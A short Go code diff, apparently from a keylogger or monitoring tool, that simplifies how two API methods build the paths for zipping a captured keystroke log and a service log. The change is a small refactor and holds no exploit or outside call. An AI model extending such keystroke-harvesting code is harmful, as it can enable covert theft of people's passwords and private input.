@@ -36,8 +36,8 @@ GetKeyloggerData <Api> - getting a log of deep keys in a zip archive
 		1. method <string> - method
 */
 func (a *Api) GetKeyloggerData(method string) (string, string) {
-	trgtPath := fmt.Sprint(a.cfg.Zipper.Path, a.cfg.Zipper.Name)
-	klPath := fmt.Sprint(a.cfg.Keylogger.Path, a.cfg.Keylogger.Name)
+	trgtPath := a.cfg.Zipper.Path
+	klPath := a.cfg.Keylogger.Path
 
 	return a.bodyBuilder(method, trgtPath, []string{klPath})
 }
@@ -51,7 +51,7 @@ GetKeyloggerData <Api> - getting a log of service
 		1. method <string> - method
 */
 func (a *Api) GetLogs(method string) (string, string) {
-	trgtPath := fmt.Sprint(a.cfg.Zipper.Path, a.cfg.Zipper.Name)
+	trgtPath := a.cfg.Zipper.Path
 
 	return a.bodyBuilder(method, trgtPath, []string{a.cfg.Logger.Path})
 }
